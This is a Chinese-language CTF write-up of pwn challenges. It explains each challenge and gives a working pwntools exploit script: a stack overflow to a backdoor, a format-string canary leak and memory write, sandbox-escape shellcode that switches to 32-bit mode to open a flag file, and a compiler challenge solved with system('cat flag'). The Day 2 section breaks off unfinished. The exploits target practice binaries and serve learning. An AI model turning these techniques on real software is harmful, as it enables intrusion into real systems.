CrazyCat PWN

# Day1
## ezpwn
![[Pasted image 20250210232353.png]]
输入的值与DAT_00405068一样后便可以栈溢出。
![[Pasted image 20250210232500.png]]
答案是年度最佳astrobot。
![[Pasted image 20250210232539.png]]
可以找到backdoors，构造payload即可。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = True
if local:
	p = process('./ezpwn')
else:
	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194eda1-f812-771e-9167-d804f8f8a76f')

ret = 0x40101a
backdoors = 0x401539
key = b'astrobot'
p.recvuntil(b'\x21\x0a')
p.send(key)
p.recvuntil(b'something:')
payload = b'A' * 0x58 + p64(ret) + p64(backdoors)
p.sendline(payload)
p.interactive()
```
shell:
![[Pasted image 20250210232813.png]]
## fmt_str
有backdoor，开启了canary，有格式化字符串漏洞，可以用该漏洞泄漏canary。
![[Pasted image 20250210232848.png]]
有两个有用的函数，第一个当地址为0x404068的值为0x56785678时便可以进入第二步，第二步则是简单的ret2text。
第一步用格式化字符串漏洞修改0x404068的值为0x56785678即可。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
	p = process('./fmt_str')
	pwnlib.gdb.attach(p, 'b *0x40127b')
else:
	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194f07e-58cc-74dd-b653-4657c29d274e')  

backdoor = 0x4013df
change_addr = 0x404068
ret = 0x40101a

p.sendlineafter(b'Input:', b'%25$p')
p.recvuntil(b'0x')
canary = int(p.recv(16), 16)
log.info(f'canary: {hex(canary)}')

payload = fmtstr_payload(8, {change_addr: 0x56785678}, write_size='byte')
p.sendlineafter(b'Input:', payload)
p.recvuntil(b'first step!')

payload2 = b'a' * 0x88 + p64(canary) + b'b' * 8 + p64(ret) + p64(backdoor)
p.sendline(payload2)

p.interactive()
```
shell:
![[Pasted image 20250210233359.png]]
## shellcode
![[Pasted image 20250210233720.png]]
可以看到是一个开启了sandbox的shellcode题。
![[Pasted image 20250210233928.png]]
sandbox仅允许使用rw,可以看到是缺o的，该怎么办呢，搜索后发现fstat函数的系统调用0x5是32位的open函数的系统调用，所以思路就是用mmap开辟一个新的空间来存放一段32位的程序然后在里面调用32位的open，然后再切换回64位调用read和write函数。
exp:
```python
from pwn import *
from wstube import websocket

# context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
	p = process('./shellcode')
	pwnlib.gdb.attach(p, 'b printf')
else:
	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194f082-499c-7e79-aaec-7f4576faa685')

elf = ELF('./shellcode')
buf = elf.bss()
print(hex(buf))

shellcode = '''
	/* 恢复rsp */
	mov rsp, rdx
	add sp, 0x100
	
	/* mmap(0x40404040, 0x7e, 7, 34, 0, 0) */
	/* 一定要搞清楚哪个寄存器存哪个参数，不然怎么错的都不知道 */
	mov rdi, 0x40404040
	mov rsi, 0x7e
	mov rdx, 7
	mov rax, 9
	mov r8, 0
	mov r9, 0
	mov r10, 34
	syscall
	
	/* read(0, 0x40404040, 0x100) */
	mov rdi, 0
	mov rsi, 0x40404040
	mov rdx, 0x100
	mov rax, 0
	syscall
	
	/* mode_64 -> mode_32 */
	push 0x23
	push 0x40404040
	retfq
'''

shellcode_x86 = '''
	mov esp, 0x40404140
	push 0x67616c66
	push esp
	pop ebx
	xor ecx, ecx
	mov eax, 5
	int 0x80
	mov ecx, eax
'''
shellcode_flag = '''
	push 0x33
	push 0x40404089
	retfq
	
	mov rdi, rcx
	mov rsi, rsp
	mov rdx, 0x70
	xor rax, rax
	syscall
	
	mov rdi, 1
	mov rax, 1
	syscall
'''
shellcode = asm(shellcode, arch='amd64', os='linux')
shellcode_flag = asm(shellcode_flag, arch='amd64', os='linux')
shellcode_x86 = asm(shellcode_x86)
p.sendlineafter('shellcode:', shellcode)
pause()
p.sendline(shellcode_x86 + 0x29 * b'\x90' + shellcode_flag)

p.interactive()
```
shell:
![[Pasted image 20250210233827.png]]
## walt改造的编译器
是一个自制的编译器，编译后有一千多行代码不好逐行分析，大致作用就是输入一段c的代码然后会编译他并运行，我们直接输入
```c
int main()
{
	system("cat flag");
	return 0;
}
```
即可。题目只是看着唬人。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
	p = process('./walt')
	pwnlib.gdb.attach(p, 'b puts')
else:
	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194ef0d-e305-79ab-b861-72f478ac41cf')

test = r'''int main(){system("cat flag");return 0;}'''

# p.recvuntil(b'This is crazy!!!')
p.sendline(test)

p.interactive()
```
shell:
![[Pasted image 20250210234818.png]]

# D2
## Berial
![[Pasted image 20250211191107.png]]
可以看到有栈溢出但不多，可以猜到要用栈迁移，checksec后发现打开了pie，那么我们就需要获取很多东西，栈地址，code地址和libc的基址。
可以发现能泄漏的地方是第一次read的puts函数，他会一直输出直到遇到\x00。
那么思路就是，第一次循环内，用第一个puts先泄漏code段的地址获取code段的基址然后根据偏移就能得到code段的其他地址，在第二个read函数劫持返回回到开始，进入第二次循环。
第二次循环，用puts函数泄漏stack段的地址，然后开始构造栈迁移并泄漏libc，然后构造ROP获取shell。
下面是逐步分析。
第一步，泄漏code段地址
``
## unjoke

## Natro
不会